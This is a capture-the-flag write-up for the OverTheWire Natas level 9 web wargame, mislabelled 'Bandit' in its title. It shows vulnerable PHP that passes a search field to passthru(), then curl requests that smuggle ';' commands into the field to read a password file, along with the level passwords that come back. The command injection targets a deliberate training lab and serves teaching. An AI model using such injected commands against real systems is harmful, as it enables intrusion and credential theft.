# BANDIT LEVEL 9

```
http://overthewire.org/wargames/natas/natas9.html
```

```
Username: natas9
Password: W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
URL:      http://natas9.natas.labs.overthewire.org
```

<img src='index.jpg' width=500px>

### SOLUTION

Looks like we have a form which takes the input `needle` and uses it as the
search pattern for `grep` against a file called `dictionary.txt`.

```
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```

Since the source is just taking our input directly as the regular expression
pattern, what if we use `.*` to match against everything in the file?

```
$ curl 'http://natas9.natas.labs.overthewire.org/?needle=.*&submit=Search' -H 'Authorization: Basic bmF0YXM5OlcwbU1oVWNSUm5HOGRjZ2hFNHF2azNKQTlsR3Q4bkRs'
```

So this works and does dump the entire `dictionary.txt` to us, but that doesn't
contain anything that looks like the password. What if we exploit the codes use
of the `passthru()` function to execute our own commands?

```
passthru() - http://php.net/manual/en/function.passthru.php

The passthru() function is similar to the exec() function in that it executes a command.
```

The `;` character can be used to delimit commands within a single line, so let's
try something like: `somestring; ls -l /etc/natas_webpass/natas10` as our input
as that will turn into..

```
passthru("grep -i somestring; ls -l /etc/natas_webpass/natas10 dictionary.txt");
```

Submittng that search string we get..

```
Output:
<pre>
-r--r----- 1 natas10 natas9     33 Dec 20  2016 /etc/natas_webpass/natas10
-rw-r----- 1 natas9  natas9 460878 Dec 15  2016 dictionary.txt
</pre>
```

Great.. now all we need to do is dump that file for our password by tweaking
our input to something like: `somestring; cat /etc/natas_webpass/natas10; ls -l`
which would become..

```
passthru("grep -i somestring; cat /etc/natas_webpass/natas10; ls -l dictionary.txt");
```

The trailing `ls -l` was just so we didn't dump the contents of dictionary.txt
as well.

```
$ curl 'http://natas9.natas.labs.overthewire.org/?needle=somestring%3B+cat+%2Fetc%2Fnatas_webpass%2Fnatas10%3B+ls+-l&submit=Search' -H 'Authorization: Basic bmF0YXM5OlcwbU1oVWNSUm5HOGRjZ2hFNHF2azNKQTlsR3Q4bkRs'
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas9", "pass": "W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl" };</script></head>
<body>
<h1>natas9</h1>
<div id="content">
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
-rw-r----- 1 natas9 natas9 460878 Dec 15  2016 dictionary.txt
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```
